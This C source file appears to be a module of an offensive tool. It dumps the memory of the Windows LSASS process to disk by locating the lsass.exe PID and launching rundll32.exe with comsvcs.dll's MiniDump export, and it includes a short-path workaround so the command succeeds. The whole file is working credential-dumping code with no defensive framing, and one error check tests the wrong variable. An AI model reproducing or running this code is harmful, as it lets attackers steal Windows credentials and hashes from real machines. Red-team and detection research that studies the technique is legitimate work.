/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpComsvcs.c                                                                       *
*  Purpose:      Performs lsass.exe dumping with comsvcs.dll and rundll32.exe.                       *
*                                                                                                    *
******************************************************************************************************/
#include "DumpComsvcs.h"
#include "Common.h"
#include <strsafe.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     RUNDLL32_COMMAND_LINE_MAX_LEN                                                       *
*  Purpose:      The maximum length of the rundll32.exe command-line in characters.                  *
*                                                                                                    *
******************************************************************************************************/
#define RUNDLL32_COMMAND_LINE_MAX_LEN (MAX_PATH * 4)

/******************************************************************************************************
*                                                                                                     *
*   Function:     DUMPCOMSVCS_DumpToDisk                                                              *
*                                                                                                     *
*******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPCOMSVCS_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    WCHAR wszLongDumpPath[MAX_PATH] = { 0 };
    WCHAR wszShortDumpPath[MAX_PATH] = { 0 };
    WCHAR wszCommandLine[RUNDLL32_COMMAND_LINE_MAX_LEN] = { 0 };
    WCHAR wszExpandedCommandLine[RUNDLL32_COMMAND_LINE_MAX_LEN] = { 0 };
    DWORD dwLsassPid = 0;
    HRESULT hrStringResult = E_UNEXPECTED;
    HANDLE hProcess = NULL;
    DWORD dwExitCode = 0;
    BOOL bDeleteFile = FALSE;

    // Validate arguments
    if (ARG_INDEX_DUMP_PATH >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszLongDumpPath, ARRAYSIZE(wszLongDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // We must create the file to get the short path for it
    eStatus = COMMON_TouchFile(wszLongDumpPath);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_TouchFile failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }
    bDeleteFile = TRUE;

    // Resolve the dump path to a short file path
    // Due to a bug in the MiniDump export in the comsvcs.dll - there can be no wrapping quotes and therefore we cannot have spaces
    if (0 == GetShortPathNameW(wszLongDumpPath, wszShortDumpPath, ARRAYSIZE(wszShortDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"GetShortPathNameW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Resolve lsass.exe PID
    eStatus = COMMON_FindLsassPid(&dwLsassPid);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FindLsassPid failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Build the rundll32.exe commandline
    hrStringResult = StringCchPrintfW(wszCommandLine, ARRAYSIZE(wszCommandLine), L"\"%%WINDIR%%\\System32\\rundll32.exe\" \"%%WINDIR%%\\System32\\comsvcs.dll\", MiniDump %lu %ls full", dwLsassPid, wszShortDumpPath);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Expand all environment variables
    if (0 == ExpandEnvironmentStringsW(wszCommandLine, wszExpandedCommandLine, ARRAYSIZE(wszExpandedCommandLine)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Run the process
    eStatus = COMMON_RunProcess(wszExpandedCommandLine, TRUE, TRUE, &hProcess, NULL);
    if (FAILED(hrStringResult))
    {
        DEBUG_MSG(L"RunProcess failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Get the process exit code
    // Note the exit code should be valid since we've waited for the process
    if (!GetExitCodeProcess(hProcess, &dwExitCode))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"GetExitCodeProcess() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Validate the process exit code
    if (0 != dwExitCode)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Command line \"%ls\" failed with exit code %lu", wszExpandedCommandLine, dwExitCode);
        goto lblCleanup;
    }

    // Success
    bDeleteFile = FALSE;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hProcess);
    if (bDeleteFile)
    {
        (VOID)DeleteFileW(wszLongDumpPath);
    }

    // Return result
    return eStatus;
}
